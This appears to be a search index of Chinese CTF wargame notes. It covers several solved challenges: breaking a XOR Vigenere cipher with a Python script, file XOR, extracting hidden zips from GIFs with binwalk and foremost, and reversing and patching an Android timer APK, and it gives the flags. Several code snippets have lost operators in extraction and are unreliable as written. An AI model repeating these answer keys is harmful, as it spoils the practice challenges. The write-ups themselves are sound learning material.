            "text": "题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#Vigenere\n\n\n1.The encode pragram is given; 2.Do u no \nindex of coincidence \n？ 3.The key is last 6 words of the plain text(with \"nctf{}\" when submitted, also without any interpunction) \n\n\n\n\n解答思路\n\n\n\n\n参考：https://www.tr0y.wang/2016/09/26/NyouCTF/\n\n\n\n\n\n\n题目的类型为简单的xor型vigenere加密\n\n\n\n\n题目给出了加密方式，长度在1到13之间，并且对每个字符的ascii码的十六进制数按位异或，得到密文\n\n\n\n\n\n\n猜测密钥可能的位数，具体看参考链接\n\n\n\n\n\n\n暴力穷举，密文和密钥异或得到最多可打印字符的位作为当前位的密钥位\n\n\n\n\n\n\n本题的参考链接中自己用python实现了破解，但在\naugusto-ludtke\n中，给出了更有效的解决办法，而且通用性更高，具体用法参看其readme\n\n\n\n\n\n\n解题步骤\n\n\n\n\n解密方法：\n\n\n\n\n# -*- coding: cp936 -*-\nimport re,pprint\nfrom Crypto.Util import strxor\nC = 'F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794'\ngcd = []\nfor z in set(re.findall(r'(.{2})',C)): #2个一组\n    loc = [0]+[s.start() for s in re.finditer(z, C)]\n    gcd += [j-i for i,j in zip(loc,loc[1:])]\n#分别计算能被1-14整除的距离数\npprint.pprint(sorted([(j,i) for (i,j) in [[i, sum([j for j in gcd if j%i==0 and j])] for i in range(1,14)]], reverse = True))\n#7较难被整除, 在结果里却排名靠前, 说明Keylen很有可能是7\nKeylen = 7\nKey = ['*'] * Keylen\nKeyStr = ['*'] * Keylen\n\nCsplit = [re.findall(r'(.{2})',z) for z in re.findall(r'(.{'+str(Keylen*2)+'})',C)]\n\n\n# pprint.pprint(Csplit)\npprint.pprint(zip(*Csplit))\npprint.pprint(map(list,[zip(*Csplit)])[0])\nprint (zip(*Csplit))\nprint (map(list,[zip(*Csplit)])[0])\nTranspose = zip(*Csplit)\nTranspose = map(list,[zip(*Csplit)])[0]\n\nfor i in range(Keylen):\n    m = 0\n    for k in range(255):\n        score = len(re.findall(r'[a-zA-Z ,\\.;?!:]', ''.join([strxor.strxor(c.decode('hex'), chr(k)) for c in Transpose[i]])))\n        if m \n score:\n            m = score\n            Key[i] = chr(k).encode('hex')\n            KeyStr[i] = chr(k)\n# keyStr = ''.join(Key)\nprint 'key:', ''.join(Key)\nprint 'key(ascii):', ''.join(KeyStr)\nprint 'key(ascii):', str(''.join(Key).decode('hex'))\n\nKey = str(''.join(Key).decode('hex'))*100\nprint 'M:',strxor.strxor(Key[:len(C.decode('hex'))],C.decode('hex'))\n\n\n\n\n待实现\n\n\n\n\n判断题目特征：\ncrypto\n \nvigenere\n \nsimple_xor\n\n\n赋值变量\ncipher=\n(密文)，\ncipher_method\n(加密方式，这里是\nvigenere\n )，\ntools\n(采用的工具，这里是xorbreak)\n\n\n给出chrome的linux shell界面，并自动填充命令模板，执行猜解长度操作\n\n\n填充猜解密钥的命令模板，填充最优猜解项，自动执行，或者等待用户修改后执行\n\n\n用户确认结果正确后，根据题目要求，自动获取需要提交的flag，经过必要的修改（类似添加nctf{}之类的操作），自动提交，或者等待用户修改后提交", 
            "title": "[ctf.nuptzj.cn] vigenere"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_vigenere/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#Vigenere  1.The encode pragram is given; 2.Do u no  index of coincidence  ？ 3.The key is last 6 words of the plain text(with \"nctf{}\" when submitted, also without any interpunction)", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_vigenere/#_2", 
            "text": "参考：https://www.tr0y.wang/2016/09/26/NyouCTF/    题目的类型为简单的xor型vigenere加密   题目给出了加密方式，长度在1到13之间，并且对每个字符的ascii码的十六进制数按位异或，得到密文    猜测密钥可能的位数，具体看参考链接    暴力穷举，密文和密钥异或得到最多可打印字符的位作为当前位的密钥位    本题的参考链接中自己用python实现了破解，但在 augusto-ludtke 中，给出了更有效的解决办法，而且通用性更高，具体用法参看其readme", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_vigenere/#_3", 
            "text": "解密方法：   # -*- coding: cp936 -*-\nimport re,pprint\nfrom Crypto.Util import strxor\nC = 'F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794'\ngcd = []\nfor z in set(re.findall(r'(.{2})',C)): #2个一组\n    loc = [0]+[s.start() for s in re.finditer(z, C)]\n    gcd += [j-i for i,j in zip(loc,loc[1:])]\n#分别计算能被1-14整除的距离数\npprint.pprint(sorted([(j,i) for (i,j) in [[i, sum([j for j in gcd if j%i==0 and j])] for i in range(1,14)]], reverse = True))\n#7较难被整除, 在结果里却排名靠前, 说明Keylen很有可能是7\nKeylen = 7\nKey = ['*'] * Keylen\nKeyStr = ['*'] * Keylen\n\nCsplit = [re.findall(r'(.{2})',z) for z in re.findall(r'(.{'+str(Keylen*2)+'})',C)]\n\n\n# pprint.pprint(Csplit)\npprint.pprint(zip(*Csplit))\npprint.pprint(map(list,[zip(*Csplit)])[0])\nprint (zip(*Csplit))\nprint (map(list,[zip(*Csplit)])[0])\nTranspose = zip(*Csplit)\nTranspose = map(list,[zip(*Csplit)])[0]\n\nfor i in range(Keylen):\n    m = 0\n    for k in range(255):\n        score = len(re.findall(r'[a-zA-Z ,\\.;?!:]', ''.join([strxor.strxor(c.decode('hex'), chr(k)) for c in Transpose[i]])))\n        if m   score:\n            m = score\n            Key[i] = chr(k).encode('hex')\n            KeyStr[i] = chr(k)\n# keyStr = ''.join(Key)\nprint 'key:', ''.join(Key)\nprint 'key(ascii):', ''.join(KeyStr)\nprint 'key(ascii):', str(''.join(Key).decode('hex'))\n\nKey = str(''.join(Key).decode('hex'))*100\nprint 'M:',strxor.strxor(Key[:len(C.decode('hex'))],C.decode('hex'))", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_vigenere/#_4", 
            "text": "判断题目特征： crypto   vigenere   simple_xor  赋值变量 cipher= (密文)， cipher_method (加密方式，这里是 vigenere  )， tools (采用的工具，这里是xorbreak)  给出chrome的linux shell界面，并自动填充命令模板，执行猜解长度操作  填充猜解密钥的命令模板，填充最优猜解项，自动执行，或者等待用户修改后执行  用户确认结果正确后，根据题目要求，自动获取需要提交的flag，经过必要的修改（类似添加nctf{}之类的操作），自动提交，或者等待用户修改后提交", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/", 
            "text": "题目\n\n\n\n\n同性真爱，异性相吸都是假的！\n（题目要求，我是直的）\n\n\n解密压缩文件里的内容\n\n\nTIPS:\n1.xor\n2.hex2binary\n3.len(bin(miwen))==len(bin(mingwen))\n\n\n密文：lovelovelovelovelovelovelovelove\n\n\n明文：\n\n\n\n\n解题\n\n\n思路\n\n\n\n\nxor两个文件的ascii码\n\n\n\n\n步骤\n\n\n\n\npython代码实现\n\n\n\n\npython\n  ens = open('D:/all/sec/exercise/gongxin/nanyou/biubiubiu/mingwen.txt'，'r').read()\n  des = open('D:/all/sec/exercise/gongxin/nanyou/biubiubiu/miwen.txt'，'r').read()\n  flag = ''\n  for i in range(len(ens)):\n       flag = flag + chr(ord(des[i])^ord(ens[i]))\n  print flag\n\n\n待实现\n\n\n\n\n实现该题目的自动答题通用性较低，可以考虑实现chrome的\npython console\n，自动获取压缩文件，并解压到指定题目的目录下，然后自动生成读取文件的代码", 
            "title": "[ctf.nuptzj.cn] xor"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/#_1", 
            "text": "同性真爱，异性相吸都是假的！\n（题目要求，我是直的）  解密压缩文件里的内容  TIPS:\n1.xor\n2.hex2binary\n3.len(bin(miwen))==len(bin(mingwen))  密文：lovelovelovelovelovelovelovelove  明文：", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/#_2", 
            "text": "", 
            "title": "解题"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/#_3", 
            "text": "xor两个文件的ascii码", 
            "title": "思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/#_4", 
            "text": "python代码实现   python\n  ens = open('D:/all/sec/exercise/gongxin/nanyou/biubiubiu/mingwen.txt'，'r').read()\n  des = open('D:/all/sec/exercise/gongxin/nanyou/biubiubiu/miwen.txt'，'r').read()\n  flag = ''\n  for i in range(len(ens)):\n       flag = flag + chr(ord(des[i])^ord(ens[i]))\n  print flag", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_xor/#_5", 
            "text": "实现该题目的自动答题通用性较低，可以考虑实现chrome的 python console ，自动获取压缩文件，并解压到指定题目的目录下，然后自动生成读取文件的代码", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/crypto_summary/", 
            "text": "Cryto Summary\n\n\n编码识别", 
            "title": "Cryto Summary"
        }, 
        {
            "location": "/wargame/crypto/crypto_summary/#cryto-summary", 
            "text": "", 
            "title": "Cryto Summary"
        }, 
        {
            "location": "/wargame/crypto/crypto_summary/#_1", 
            "text": "", 
            "title": "编码识别"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/", 
            "text": "题目\n\n\n\n\nhttp://chinalover.sinaapp.com/web2/index.html\n\n\n\n\n\n解答思路\n\n\n\n\n二进制编辑器查看GIF\n\n\n在文件末尾找flag\n\n\n\n\n解题步骤\n\n\n\n\n使用strings查看2.gif\n\n\n\n\nshell\n   strings -a 2.gif|grep ctf\n\n\n得到结果：\n\n\n\n\n;nctf{photo_can_also_hid3_msg} \n\n\n\n\n\n\n或者使用winhex查看，找到flag\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n待实现\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] gif"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/#_1", 
            "text": "http://chinalover.sinaapp.com/web2/index.html", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/#_2", 
            "text": "二进制编辑器查看GIF  在文件末尾找flag", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/#_3", 
            "text": "使用strings查看2.gif   shell\n   strings -a 2.gif|grep ctf  得到结果：   ;nctf{photo_can_also_hid3_msg}     或者使用winhex查看，找到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_gif/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/", 
            "text": "丘比龙de女神\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E4%B8%98%E6%AF%94%E9%BE%99De%E5%A5%B3%E7%A5%9E\n\n\n丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！\n\n\n没错 里面隐藏了一张女神的照片\nflag是照片文件的md5值(小写)\n记住加上flag{}\n\n\n\n\n\n\n解答思路\n\n\n\n\nbinwalk查看隐藏信息\n\n\n010 edtior查看文件结构并修复\n\n\n注意文件的开始位置\n\n\n\n\n解题步骤\n\n\n0x1 题目解读\n\n\n\n\n该gif中隐藏有一张女神(\nnvshen\n)的照片\n\n\n计算该图片的flag值，加上flag{}之后提交\n\n\n\n\n0x2 binwalk分析\n\n\nbinwalk pikaqiu.gif \n\n\n\n\n输出：\n\n\n\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n\n\n0             0x0             GIF image data, version \"87a\", 100 x 100\n115088        0x1C190         End of Zip archive\n\n\n\n\n看出该gif中隐藏有zip文件，但是只有结尾，文件头需要修复\n\n\n0x2 010 editor查看\n\n\n010 editor打开该gif，模板结果如下：\n\n\n\n\n可以看出，该文件的结尾在\nD8C2\n处，可以观察到其后有\nlove\n和\nnvshen.jpg\n两个有意义的词，所以，可以猜测从love开始到文件结尾应该是隐藏的zip文件（这里收集关键词 love 和 nvshen）\n\n\n0x3 导出并修复该zip文件\n\n\n\n\n在\n6c\n处选择\nselection start\n，在结尾处选择\nselection end\n,file中选择\nsave selection\n，保存成zip文件\npikaqiu_D8C3h_E8E3h.zip\n\n\n010editor打开该文件，然后将文件头修改为\n504b0304\n，保存后使用zip解压缩软件解压，发现需要输入密码，尝试输入\nlove\n，成功\n\n\n\n\n0x4 md5sum计算md5\n\n\n使用md5sum计算，加上flag{}之后提交\n\n\n自动化解析\n\n\n\n\n判断题目特征：\nweb\n \nsimple\n \nwebpage_source\n\n\n设定题目难度等级\nlevel\n为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到\nflag\n，并对其赋值，自动提交", 
            "title": "丘比龙de女神"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#de", 
            "text": "", 
            "title": "丘比龙de女神"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#%E4%B8%98%E6%AF%94%E9%BE%99De%E5%A5%B3%E7%A5%9E  丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！  没错 里面隐藏了一张女神的照片\nflag是照片文件的md5值(小写)\n记住加上flag{}", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#_2", 
            "text": "binwalk查看隐藏信息  010 edtior查看文件结构并修复  注意文件的开始位置", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#0x1", 
            "text": "该gif中隐藏有一张女神( nvshen )的照片  计算该图片的flag值，加上flag{}之后提交", 
            "title": "0x1 题目解读"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#0x2-binwalk", 
            "text": "binwalk pikaqiu.gif   输出：   DECIMAL       HEXADECIMAL     DESCRIPTION  0             0x0             GIF image data, version \"87a\", 100 x 100\n115088        0x1C190         End of Zip archive   看出该gif中隐藏有zip文件，但是只有结尾，文件头需要修复", 
            "title": "0x2 binwalk分析"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#0x2-010-editor", 
            "text": "010 editor打开该gif，模板结果如下：   可以看出，该文件的结尾在 D8C2 处，可以观察到其后有 love 和 nvshen.jpg 两个有意义的词，所以，可以猜测从love开始到文件结尾应该是隐藏的zip文件（这里收集关键词 love 和 nvshen）", 
            "title": "0x2 010 editor查看"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#0x3-zip", 
            "text": "在 6c 处选择 selection start ，在结尾处选择 selection end ,file中选择 save selection ，保存成zip文件 pikaqiu_D8C3h_E8E3h.zip  010editor打开该文件，然后将文件头修改为 504b0304 ，保存后使用zip解压缩软件解压，发现需要输入密码，尝试输入 love ，成功", 
            "title": "0x3 导出并修复该zip文件"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#0x4-md5summd5", 
            "text": "使用md5sum计算，加上flag{}之后提交", 
            "title": "0x4 md5sum计算md5"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_qiubilong/#_4", 
            "text": "判断题目特征： web   simple   webpage_source  设定题目难度等级 level 为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到 flag ，并对其赋值，自动提交", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/", 
            "text": "图种\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E5%9B%BE%E7%A7%8D\n\n\nflag是动态图最后一句话的拼音首字母 加上nctf{}  \n\n\n\n\n\n\n解答思路\n\n\n\n\nbinwalk查看隐藏信息\n\n\nforemost提取隐藏信息\n\n\n\n\n解题步骤\n\n\n0x1 binwalk分析\n\n\nbinwalk  555.gif\n\n\n\n\n输出：\n\n\n\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n\n\n0             0x0             GIF image data, version \"87a\", 100 x 100\n58000         0xE290          Zip archive data, at least v2.0 to extract, compressed size: 10882, uncompressed size: 15579, name: 233333.gif\n69014         0x10D96         End of Zip archive\n\n\n\n\n说明存在隐藏的zip文件\n\n\n0x2 foremost提取\n\n\nforemost -i 555.gif \n\n\n\n\n输出：\n\n\n\n\nFile: 555.gif\nStart: Wed Jul 18 23:28:07 2018\nLength: 67 KB (69036 bytes)\n\n\nNum    Name (bs=512)         Size  File Offset     Comment \n\n\n0:    00000000.gif          56 KB               0       (100 x 100)\n1:    00000113.zip          10 KB           58000    \n\nFinish: Wed Jul 18 23:28:07 2018\n\n\n2 FILES EXTRACTED \ngif:= 1\n\n\nzip:= 1\n\n\n\n\n0x3 解压缩zip文件\n\n\nunzip output/zip/00000113.zip\n\n\n\n\n输出：\n\n\n\n\n233333.gif\n\n\n\n\n0x4 查看gif文件\n\n\neog 233333.gif\n\n\n\n\n输出：\n\n\n*\n\n\n\n\n根据题目给出的提示，得到最后一句话的拼音首字母：dssdcmkw\n\n\n拼接后提交：\nnctf{dssdcmkw}\n\n\n\n\n自动化解析\n\n\n\n\n判断题目特征：\nweb\n \nsimple\n \nwebpage_source\n\n\n设定题目难度等级\nlevel\n为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到\nflag\n，并对其赋值，自动提交", 
            "title": "图种"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#_1", 
            "text": "", 
            "title": "图种"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#_2", 
            "text": "http://ctf.nuptzj.cn/challenges#%E5%9B%BE%E7%A7%8D  flag是动态图最后一句话的拼音首字母 加上nctf{}", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#_3", 
            "text": "binwalk查看隐藏信息  foremost提取隐藏信息", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#_4", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#0x1-binwalk", 
            "text": "binwalk  555.gif  输出：   DECIMAL       HEXADECIMAL     DESCRIPTION  0             0x0             GIF image data, version \"87a\", 100 x 100\n58000         0xE290          Zip archive data, at least v2.0 to extract, compressed size: 10882, uncompressed size: 15579, name: 233333.gif\n69014         0x10D96         End of Zip archive   说明存在隐藏的zip文件", 
            "title": "0x1 binwalk分析"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#0x2-foremost", 
            "text": "foremost -i 555.gif   输出：   File: 555.gif\nStart: Wed Jul 18 23:28:07 2018\nLength: 67 KB (69036 bytes)  Num    Name (bs=512)         Size  File Offset     Comment   0:    00000000.gif          56 KB               0       (100 x 100)\n1:    00000113.zip          10 KB           58000     \nFinish: Wed Jul 18 23:28:07 2018  2 FILES EXTRACTED \ngif:= 1  zip:= 1", 
            "title": "0x2 foremost提取"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#0x3-zip", 
            "text": "unzip output/zip/00000113.zip  输出：   233333.gif", 
            "title": "0x3 解压缩zip文件"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#0x4-gif", 
            "text": "eog 233333.gif  输出：  *   根据题目给出的提示，得到最后一句话的拼音首字母：dssdcmkw  拼接后提交： nctf{dssdcmkw}", 
            "title": "0x4 查看gif文件"
        }, 
        {
            "location": "/wargame/misc/[ctf.nuptzj.cn]_tuzhong/#_5", 
            "text": "判断题目特征： web   simple   webpage_source  设定题目难度等级 level 为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到 flag ，并对其赋值，自动提交", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/", 
            "text": "Timer(阿里CTF)\n\n\n0x1 题目\n\n\n\n\nflag格式 flag{} \n\n\n\n\n0x2 解题步骤\n\n\n参考链接：https://blog.csdn.net/xiangshangbashaonian/article/details/80301054\n\n\n0x1 jeb分析文件\n\n\n\n\napk安装之后出现一个读秒的，20万秒，大于3600，所以大于一个小时，所以太慢了，不等了。 \n\n\n\n\njeb反编译，MainActivity代码 \n\n\npackage net.bluelotus.tomorrow.easyandroid;\n\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.support.v7.app.AppCompatActivity;\nimport android.view.Menu;\nimport android.view.MenuItem;\nimport android.view.View;\n\npublic class MainActivity extends AppCompatActivity {\n    int beg;\n    int k;\n    int now;\n    long t;\n\n    static {\n        System.loadLibrary(\nlhm\n);\n    }\n\n    public MainActivity() {\n        super();\n        this.beg = (((int)(System.currentTimeMillis() / 1000))) + 200000;\n        this.k = 0;\n        this.t = 0;\n    }\n\n    public static boolean is2(int n) {\n        boolean v1 = true;\n        if(n \n 3) {\n            if(n % 2 != 0 \n n % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0 \n= n) {\n                        if(n % v0 != 0 \n n % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n\n                return false;\n            }\n\n            v1 = false;\n        }\n        else if(n \n= 1) {\n            v1 = false;\n        }\n\n        return v1;\n    }\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        this.setContentView(2130968600);\n        View v2 = this.findViewById(2131492944);\n        View v3 = this.findViewById(2131492945);\n        Handler v0 = new Handler();\n        v0.postDelayed(new Runnable() {\n            public void run() {\n                MainActivity.this.t = System.currentTimeMillis();\n                MainActivity.this.now = ((int)(MainActivity.this.t / 1000));\n                MainActivity.this.t = 1500 - MainActivity.this.t % 1000;\n                this.val$tv2.setText(\nAliCTF\n);\n                if(MainActivity.this.beg - MainActivity.this.now \n= 0) {\n                    this.val$tv1.setText(\nThe flag is:\n);\n                    this.val$tv2.setText(\nalictf{\n + MainActivity.this.stringFromJNI2(MainActivity.this\n                            .k) + \n}\n);\n                }\n\n                if(MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {\n                    MainActivity.this.k += 100;\n                }\n                else {\n                    --MainActivity.this.k;\n                }\n\n                this.val$tv1.setText(\nTime Remaining(s):\n + (MainActivity.this.beg - MainActivity.this\n                        .now));\n                this.val$handler.postDelayed(((Runnable)this), MainActivity.this.t);\n            }\n        }, 0);\n    }\n\n    public boolean onCreateOptionsMenu(Menu menu) {\n        this.getMenuInflater().inflate(2131558400, menu);\n        return 1;\n    }\n\n    public boolean onOptionsItemSelected(MenuItem item) {\n        boolean v1 = item.getItemId() == 2131492959 ? true : super.onOptionsItemSelected(item);\n        return v1;\n    }\n\n    public native String stringFromJNI2(int arg1) {\n    }\n}\n\n\n\n\n\n\n关键点\n\n\n\n\njava\n  if(MainActivity.this.beg - MainActivity.this.now \n= 0) {\n                      this.val$tv1.setText(\"The flag is:\");\n                      this.val$tv2.setText(\"alictf{\" + MainActivity.this.stringFromJNI2(MainActivity.this\n                              .k) + \"}\");\n                  }\n\n\n\n\n找到 beg 和 now 的点： \n\n\n\n\n```java\n  public MainActivity() {\n          super();\n          this.beg = (((int)(System.currentTimeMillis() / 1000))) + 200000;//打开activity时候的时间（除以1000，所以是秒为单位）再加上200000，即200000+当前时间对应的秒\n          this.k = 0;\n          this.t = 0;\n      }\n\n\n```\n\n\n以及\nMainActivity.this.now = ((int)(MainActivity.this.t / 1000));\n即判断的时候的秒  那么 beg - now 就是 200000 + 开始的时间 - 判断的时间，也就是 200000 - 已经过去的时间，所以就是如果过去了 200000 秒，就可以出现 flag 了。  呈现 flag 是通过 native 层的\nthis.val$tv2.setText(\"alictf{\" + MainActivity.this.stringFromJNI2(MainActivity.this .k) + \"}\");\n也就是 stringFromJNI2 来呈现的，我们不必逆向 so，这个参数是一个 k，如果真的去等 200000 秒（虽然不可能），那么这里的 k 应该是多少呢？ \n\n\n\n\n跟 k 相关的两个关键点如下： \n\n\n\n\n```java\n  public static boolean is2(int n) {\n          boolean v1 = true;\n          if(n \n 3) {\n              if(n % 2 != 0 \n n % 3 != 0) {\n                  int v0 = 5;\n                  while(true) {\n                      if(v0 * v0 \n= n) {\n                          if(n % v0 != 0 \n n % (v0 + 2) != 0) {\n                              v0 += 6;\n                              continue;\n                          }\n\n\n                      return false;\n                  }\n                  else {\n                      return v1;\n                  }\n              }\n\n              return false;\n          }\n\n          v1 = false;\n      }\n      else if(n \n= 1) {\n          v1 = false;\n      }\n\n      return v1;\n  }\n\n\n\nif(MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {\n                      MainActivity.this.k += 100;\n                  }\n                  else {\n                      --MainActivity.this.k;\n                  }\n\n\n```\n\n\n\n\n总结思路：通过 beg - now 代入 is2 函数对 k 进行操作，200000，需要一秒一秒的操作，而我们，直接通过写代码模拟出 200000 的结果，找到 k，然后改动 k 值，直接调用，就可以得到 flag 了。\n\n\n\n\n0x2 计算k值\n\n\nis2 是用 java 写的，懒得看逻辑，直接复制到 java 里边： \n\n\npackage test;\n\npublic class Main {\n\n    public static boolean is2(int n) {\n        boolean v1 = true;\n        if(n \n 3) {\n            if(n % 2 != 0 \n n % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0 \n= n) {\n                        if(n % v0 != 0 \n n % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n            }\n\n            v1 = false;\n        }\n        else if(n \n= 1) {\n            v1 = false;\n        }\n\n        return v1;\n    }\n\n    public static void main(String args[]) {\n        int time = 200000;\n        int k = 0;\n        while (time \n 0) {\n            if (is2(time)) {\n                k += 100;\n            }\n            else {\n                k--;\n            }\n            time--;\n        }\n        System.out.println(k);\n    }\n\n}\n\n\n\n\n\n输出：运行得到 k 值:1616384 \n\n\n0x3 修改并打包运行原apk\n\n\n\n\n将输出 flag 的条件反过来，即 MainActivity$1.smali 中的\nif-gtz v0, :cond_0\n这句话（后面是输出 The 